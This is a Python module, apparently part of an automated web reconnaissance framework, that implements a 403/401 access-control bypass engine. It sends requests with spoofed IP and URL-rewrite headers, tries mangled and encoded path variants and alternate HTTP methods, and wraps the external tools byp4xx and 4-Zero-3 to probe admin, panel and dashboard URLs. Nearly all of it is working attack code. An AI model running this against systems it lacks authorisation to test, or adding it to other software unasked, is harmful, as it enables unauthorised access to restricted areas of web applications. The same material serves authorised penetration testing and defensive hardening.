"""
Phase 2 - Module 8c: 403/401 Bypass Engine
Attempts to bypass access controls using header manipulation and path fuzzing.
Multi-tool: byp4xx, 4-Zero-3 — all stream live output.
"""
import asyncio
import httpx
from typing import List, Dict, Optional
from urllib.parse import urlparse
from app.core.verbose import run_tool_live, v_info, v_finding


# Headers that may trick origin servers into trusting us
BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "localhost"},
    {"X-originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Override-URL": "/admin"},
    {"X-HTTP-Method-Override": "GET"},
    {"Content-Length": "0"},
    {"Referer": "https://localhost/admin"},
    # Additional bypass headers
    {"X-Forwarded-IP": "127.0.0.1"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"X-Forwarded": "127.0.0.1"},
    {"Forwarded-For": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Cluster-Client-IP": "127.0.0.1"},
    {"Via": "1.1 127.0.0.1"},
]

# Path variations that can bypass WAF / ACL rules
def get_path_bypasses(path: str) -> List[str]:
    """Generate path variants for a given restricted path."""
    p = path.rstrip("/")
    return [
        p,
        p + "/",
        p + "//",
        p + "/..",
        p + "/./",
        p.replace("/", "//"),
        "/" + p.lstrip("/").replace("/", "%2f"),
        "/" + p.lstrip("/").replace("/", "%252f"),  # Double-encoded
        p + "%20",
        p + "?",
        p + "#",
        p + "..;/",
        p + ";.json",
        "." + p,
        p.upper(),
        p + ".json",
        p + ".php",
        p.upper() + "/",
        # Extra bypasses
        p + "%09",
        p + "..%2f",
        p + "/%2e",
        "/." + p,
        p + ";/",
        p + "/.randomstring",
    ]

# HTTP method override attempts
HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "DEBUG", "TRACE"]


class FourOhThreeBypass:
    def __init__(self, timeout: int = 10):
        self.timeout = timeout

    async def test_url(self, url: str) -> List[Dict]:
        """Attempt to bypass a 403/401 restricted URL."""
        findings = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or "/"

        async with httpx.AsyncClient(verify=False, timeout=self.timeout, follow_redirects=False) as client:

            # ── 1. Original request to confirm 403 ──────────────────────
            try:
                base_resp = await client.get(url)
                if base_resp.status_code not in [401, 403]:
                    return []  # Not restricted, skip
            except Exception:
                return []

            # ── 2. Header manipulation bypass ──────────────────────────
            for header_set in BYPASS_HEADERS:
                try:
                    headers = {"User-Agent": "Mozilla/5.0", **header_set}
                    resp = await client.get(url, headers=headers)
                    if resp.status_code not in [401, 403, 404, 429]:
                        f = self._build_finding(
                            url=url,
                            technique=f"Header: {list(header_set.keys())[0]}: {list(header_set.values())[0]}",
                            status=resp.status_code,
                            original_status=base_resp.status_code,
                            confidence=0.80,
                            source="king-internal",
                        )
                        v_finding("403 Bypass", f["severity"], url, f["technique"])
                        findings.append(f)
                except Exception:
                    pass

            # ── 3. Path fuzzing bypass ─────────────────────────────────
            for bypass_path in get_path_bypasses(path):
                try:
                    bypass_url = base + bypass_path
                    resp = await client.get(bypass_url, headers={"User-Agent": "Mozilla/5.0"})
                    if resp.status_code not in [401, 403, 404, 429]:
                        f = self._build_finding(
                            url=bypass_url,
                            technique=f"Path bypass: {bypass_path}",
                            status=resp.status_code,
                            original_status=base_resp.status_code,
                            confidence=0.75,
                            source="king-internal",
                        )
                        v_finding("403 Path Bypass", f["severity"], bypass_url, bypass_path)
                        findings.append(f)
                except Exception:
                    pass

            # ── 4. HTTP method override ────────────────────────────────
            for method in HTTP_METHODS:
                try:
                    resp = await client.request(method, url, headers={"User-Agent": "Mozilla/5.0"})
                    if resp.status_code not in [401, 403, 404, 405, 429]:
                        findings.append(self._build_finding(
                            url=url,
                            technique=f"HTTP Method: {method}",
                            status=resp.status_code,
                            original_status=base_resp.status_code,
                            confidence=0.70,
                            source="king-internal",
                        ))
                except Exception:
                    pass

        return findings

    # ── byp4xx (External) ─────────────────────────────────────────────────

    async def run_byp4xx(self, url: str) -> List[Dict]:
        """
        Run byp4xx for 403/401 bypass testing.
        Install: go install github.com/lobuhi/byp4xx@latest
        """
        cmd = ["byp4xx", url]

        def parse_byp4xx(line: str) -> Optional[str]:
            # byp4xx shows lines like: 200 | GET /admin/ | Header: X-Forwarded-For
            if any(c in line for c in ["200", "201", "301", "302", "500"]):
                return line
            return None

        lines = await run_tool_live("byp4xx", cmd, parse_fn=parse_byp4xx, timeout=60)
        findings = []
        for line in lines:
            findings.append({
                "type": "403/401 Bypass (byp4xx)",
                "url": url,
                "technique": line,
                "severity": "medium",
                "confidence": 0.80,
                "evidence": f"byp4xx found a bypass: {line}",
                "suggested_next_step": "Confirm bypass in browser and check data exposure",
                "source": "byp4xx",
            })
        return findings

    # ── 4-Zero-3 (External) ───────────────────────────────────────────────

    async def run_fourzerothreetool(self, url: str) -> List[Dict]:
        """
        Run 4-Zero-3 for advanced 403 bypass.
        Install: git clone https://github.com/Dheerajmadhukar/4-ZERO-3
                 pip install -r requirements.txt
        """
        parsed = urlparse(url)
        host = parsed.netloc
        path = parsed.path or "/"

        cmd = [
            "python3", "4-ZERO-3.py",
            "-H", host,
            "-p", path,
        ]

        def parse_403tool(line: str) -> Optional[str]:
            if any(kw in line.lower() for kw in ["bypass", "200", "success", "→"]):
                return line
            return None

        lines = await run_tool_live("4-Zero-3", cmd, parse_fn=parse_403tool, timeout=60)
        findings = []
        for line in lines:
            findings.append({
                "type": "403 Bypass (4-Zero-3)",
                "url": url,
                "technique": line,
                "severity": "medium",
                "confidence": 0.75,
                "evidence": f"4-Zero-3 found bypass: {line}",
                "suggested_next_step": "Confirm in browser and document the bypass technique",
                "source": "4-Zero-3",
            })
        return findings

    def _build_finding(self, url, technique, status, original_status, confidence, source="king-internal") -> Dict:
        return {
            "type": "403/401 Bypass",
            "url": url,
            "technique": technique,
            "original_status": original_status,
            "bypass_status": status,
            "severity": "medium",
            "confidence": confidence,
            "evidence": f"Status changed from {original_status} → {status} with technique: {technique}",
            "suggested_next_step": "Confirm access in browser and test for sensitive data exposure",
            "source": source,
        }

    async def scan(self, assets: List[Dict]) -> List[Dict]:
        """Scan all assets with 4xx status codes for bypass possibilities."""
        candidates = [a for a in assets if a.get("status_code") in [401, 403]]
        # Also check admin/panel paths from directory brute-force
        admin_keywords = ["admin", "panel", "dashboard", "manage", "control", "backend", "internal"]
        for asset in assets:
            url_val = asset.get("url", "")
            if any(kw in url_val.lower() for kw in admin_keywords):
                if asset not in candidates:
                    candidates.append(asset)

        sem = asyncio.Semaphore(10)
        results = []

        async def bounded_test(asset):
            async with sem:
                url_val = asset["url"]
                internal = await self.test_url(url_val)
                ext_results = await asyncio.gather(
                    self.run_byp4xx(url_val),
                    self.run_fourzerothreetool(url_val),
                )
                combined = internal
                for r in ext_results:
                    combined.extend(r)
                return combined

        all_results = await asyncio.gather(*[bounded_test(a) for a in candidates])
        for r in all_results:
            results.extend(r)

        # Deduplicate
        seen = set()
        unique = []
        for f in results:
            key = (f.get("url", ""), f.get("technique", "")[:60])
            if key not in seen:
                seen.add(key)
                unique.append(f)
        return unique
